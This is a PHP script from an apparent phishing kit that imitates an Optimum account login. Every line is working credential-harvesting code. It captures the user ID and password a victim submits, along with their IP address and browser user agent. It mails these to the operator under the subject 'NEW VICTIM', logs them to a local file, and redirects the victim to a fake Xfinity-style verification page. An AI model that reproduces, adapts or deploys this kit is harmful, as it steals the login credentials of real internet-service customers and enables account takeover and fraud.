<?php
include('config.php');

function getRealIpAddr()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

function token() {
    $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $pass = array(); //remember to declare $pass as an array
    $alphaLength = strlen($alphabet) - 1; //put the length -1 in cache
    for ($i = 0; $i < 15; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];
    }
    return implode($pass); //turn the array into a string
}


if(isset($_POST['id']) && isset($_POST['password'])){


    $_SESSION['user'] = $_POST['id'];
    $_SESSION['passwd'] = $_POST['password'];
    $_SESSION['IP'] = getRealIpAddr();
    $_SESSION['HTTP_USER_AGENT'] = $_SERVER['HTTP_USER_AGENT'];


    $Subject = '[OPTIMUM '.getRealIpAddr().'] NEW VICTIM'; 
    $Body .= "\n\n\n\n--------------Optimum Login-----------------------\n";
    $Body .= "User ID            : ".$_POST['id']."\n";
    $Body .= "Password           : ".$_POST['password']."\n";
    $Body .= "|--------------- I N F O | I P -------------------|\n";
    $Body .= "|Client IP: ".$_SESSION['IP']."\n";
    $Body .= "|--- http://www.geoiptool.com/?IP=".$_SESSION['IP']. "----\n";
    $Body .= "User Agent : ".$_SESSION['HTTP_USER_AGENT']."\n";
    $Body .= "|----------- Optimum --------------|\n";

    @mail($not_email, $Subject, $Body);  

    $message .= "\n\n\n\n--------------Optimum Login-----------------------\n";
    $message .= "User ID            : ".$_POST['id']."\n";
    $message .= "Password           : ".$_POST['password']."\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: ".$_SESSION['IP']."\n";
    $message .= "|--- http://www.geoiptool.com/?IP=".$_SESSION['IP']. "----\n";
    $message .= "User Agent : ".$_SESSION['HTTP_USER_AGENT']."\n";
    $message .= "|----------- Optimum --------------|\n";
    $victimes = fopen("resultat.txt","a");
    fwrite($victimes,$message);
    fclose($victimes);
   

	header("Location: verification?r=comcast.net&s=oauth&continue=https%3A%2F%2Foauth.xfinity.com%2Foauth%2Fauthorize%3Fclient_id%3Dmy-account-web%26prompt%3Dlogin%26redirect_uri%3Dhttps%253A%252F%252Fcustomer.xfinity.com%252Foauth%252Fcallback%26response_type%3Dcode%26state%3Dhttps%253A%252F%252Fcustomer.xfinity.com%252F%2523%252F%26response%3D1&forceAuthn=1&client_id=my-account-web&reqId=".token());
}else{
	exit();
}
?>